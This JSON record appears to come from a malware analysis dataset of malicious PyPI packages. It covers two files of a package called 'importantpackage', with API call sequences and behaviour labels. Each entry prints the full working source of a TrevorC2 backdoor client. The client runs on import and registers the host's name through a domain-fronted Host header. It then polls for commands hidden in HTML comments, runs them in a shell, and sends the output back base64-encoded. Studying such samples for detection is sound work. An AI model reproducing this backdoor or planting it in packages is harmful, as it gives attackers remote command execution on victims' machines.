[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/importantpackage-0.2.4/importantpackage-0.2.4/importantpackage/program.py",
    "code_snippet": "# Malicious imports and constants\nimport datetime\nfrom urllib import request\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nimport sys\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        r = request.Request(url, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\n    def post(self, url, data):\n        data = json.dumps({\"output\": data})\n        encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n        r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    while not_yet_expired():\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\nwhile not_yet_expired():\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()\n",
    "pattern_analysis": {
      "api_sequence": [
        "ssl.create_default_context",
        "request.HTTPCookieProcessor",
        "request.Request",
        "request.build_opener",
        "opener.open",
        "res.read",
        "json.dumps",
        "base64.urlsafe_b64encode",
        "str.encode",
        "request.Request",
        "request.build_opener",
        "opener.open",
        "res.read",
        "platform.node",
        "time.sleep",
        "base64.b64encode",
        "str.encode",
        "str.decode",
        "req.get",
        "str.decode",
        "subprocess.Popen",
        "subprocess.PIPE",
        "proc.communicate",
        "str.encode",
        "base64.b64encode",
        "str.decode",
        "req.post",
        "time.sleep",
        "sys.exit"
      ],
      "api_sequence_with_args": [
        "ssl.create_default_context()",
        "request.HTTPCookieProcessor()",
        "request.Request(url, headers={'Host': HOST_HEADER})",
        "request.build_opener(self.cookie_processor)",
        "opener.open(r, timeout=5)",
        "res.read()",
        "json.dumps({\"output\": data})",
        "base64.urlsafe_b64encode(data.encode(\"utf-8\"))",
        "data.encode(\"utf-8\")",
        "request.Request(url, data=encoded, headers={'Host': HOST_HEADER})",
        "request.build_opener(self.cookie_processor)",
        "opener.open(r, timeout=5)",
        "res.read()",
        "platform.node()",
        "time.sleep(1)",
        "base64.b64encode(hostname_send)",
        "hostname_send.encode('utf-8')",
        "base64.b64encode(hostname_send).decode('utf-8')",
        "req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)",
        "html.decode()",
        "subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.PIPE",
        "proc.communicate()[0]",
        "(hostname + \"::::\" + str(stdout_value)).encode('utf-8')",
        "base64.b64encode(stdout_value)",
        "base64.b64encode(stdout_value).decode('utf-8')",
        "req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data=stdout_value)",
        "time.sleep(random_interval(time_interval1, time_interval2))",
        "sys.exit()"
      ],
      "mapped_sequence": [
        {
          "api_name": "ssl.create_default_context",
          "id": "create_ssl_context",
          "description": "Creates SSL context with specified protocol",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "urllib.request.HTTPCookieProcessor",
          "id": "configure_proxy_handler",
          "description": "Configures proxy handler for HTTP requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.build_opener",
          "id": "build_opener",
          "description": "Builds opener object with specified handler",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.OpenerDirector.open",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.urlsafe_b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.build_opener",
          "id": "build_opener",
          "description": "Builds opener object with specified handler",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.OpenerDirector.open",
          "id": "open_url_post_timeout",
          "description": "Opens URL with POST data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "platform.node",
          "id": "get_machine_node",
          "description": "Retrieves machine node name from uname result",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "str.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "Request.get",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.PIPE",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "subprocess.Popen.communicate",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "Request.post",
          "id": "open_url_post_timeout",
          "description": "Opens URL with POST data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "# Malicious imports and constants\nimport datetime\nfrom urllib import request\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nimport sys\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        r = request.Request(url, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\n    def post(self, url, data):\n        data = json.dumps({\"output\": data})\n        encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n        r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    while not_yet_expired():\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\nwhile not_yet_expired():\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/importantpackage-0.2.4/importantpackage-0.2.4/importantpackage/__init__.py",
    "code_snippet": "# Malicious imports and constants\nimport datetime\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nfrom urllib import request\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\n# Expiry check\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nHOST_ALIVE = True\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        try:\n            r = request.Request(url, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            HOST_ALIVE = False\n            return \"dead\"\n\n    def post(self, url, data):\n        try:\n            data = json.dumps({\"output\": data})\n            encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n            r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            HOST_ALIVE = False\n            return \"dead\"\n\n# Random interval for communication\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    # we need to register our asset first\n    while not_yet_expired() and HOST_ALIVE:\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\n# Main C2 loop\nwhile not_yet_expired() and HOST_ALIVE:\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        if html == \"dead\": HOST_ALIVE = False\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                # Malicious command execution\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()\n",
    "pattern_analysis": {
      "api_sequence": [
        "ssl.create_default_context",
        "request.HTTPCookieProcessor",
        "request.Request",
        "request.build_opener",
        "opener.open",
        "res.read",
        "json.dumps",
        "base64.urlsafe_b64encode",
        "str.encode",
        "request.Request",
        "request.build_opener",
        "opener.open",
        "res.read",
        "random.randint",
        "platform.node",
        "base64.b64encode",
        "str.encode",
        "base64.b64encode",
        "str.decode",
        "req.get",
        "time.sleep",
        "req.get",
        "str.decode",
        "subprocess.Popen",
        "subprocess.Popen.communicate",
        "str.encode",
        "base64.b64encode",
        "str.decode",
        "req.post",
        "time.sleep"
      ],
      "api_sequence_with_args": [
        "ssl.create_default_context()",
        "request.HTTPCookieProcessor()",
        "request.Request(url, headers={'Host': HOST_HEADER})",
        "request.build_opener(self.cookie_processor)",
        "opener.open(r, timeout=5)",
        "res.read()",
        "json.dumps({\"output\": data})",
        "base64.urlsafe_b64encode(data.encode(\"utf-8\"))",
        "str.encode('utf-8')",
        "request.Request(url, data=encoded, headers={'Host': HOST_HEADER})",
        "request.build_opener(self.cookie_processor)",
        "opener.open(r, timeout=5)",
        "res.read()",
        "random.randint(time_interval1, time_interval2)",
        "platform.node()",
        "base64.b64encode(hostname_send)",
        "str.encode('utf-8')",
        "base64.b64encode(stdout_value)",
        "str.decode('utf-8')",
        "req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)",
        "time.sleep(1)",
        "req.get(SITE_URL + ROOT_PATH_QUERY)",
        "str.decode()",
        "subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "proc.communicate()[0]",
        "str.encode('utf-8')",
        "base64.b64encode(stdout_value)",
        "str.decode('utf-8')",
        "req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data=stdout_value)",
        "time.sleep(random_interval(time_interval1, time_interval2))"
      ],
      "mapped_sequence": [
        {
          "api_name": "ssl.create_default_context",
          "id": "create_ssl_context",
          "description": "Creates SSL context with specified protocol",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "urllib.request.HTTPCookieProcessor",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.build_opener",
          "id": "build_opener",
          "description": "Builds opener object with specified handler",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.OpenerDirector.open",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.urlsafe_b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.build_opener",
          "id": "build_opener",
          "description": "Builds opener object with specified handler",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.OpenerDirector.open",
          "id": "open_url_post_timeout",
          "description": "Opens URL with POST data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "random.randint",
          "id": "random",
          "description": "No direct match; used for random interval, not sensitive",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "platform.node",
          "id": "get_machine_node",
          "description": "Retrieves machine node name from uname result",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "Request.get",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "Request.get",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "str.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.communicate",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "Request.post",
          "id": "open_url_post_timeout",
          "description": "Opens URL with POST data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "# Malicious imports and constants\nimport datetime\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nfrom urllib import request\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nHOST_ALIVE = True\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        try:\n            r = request.Request(url, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            HOST_ALIVE = False\n            return \"dead\"\n\n    def post(self, url, data):\n        try:\n            data = json.dumps({\"output\": data})\n            encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n            r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n            opener = request.build_opener(self.cookie_processor)\n            res = opener.open(r, timeout = 5)\n            return res.read()\n        except:\n            HOST_ALIVE = False\n            return \"dead\"\n\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    while not_yet_expired() and HOST_ALIVE:\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\nwhile not_yet_expired() and HOST_ALIVE:\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        if html == \"dead\": HOST_ALIVE = False\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()"
    }
  }
]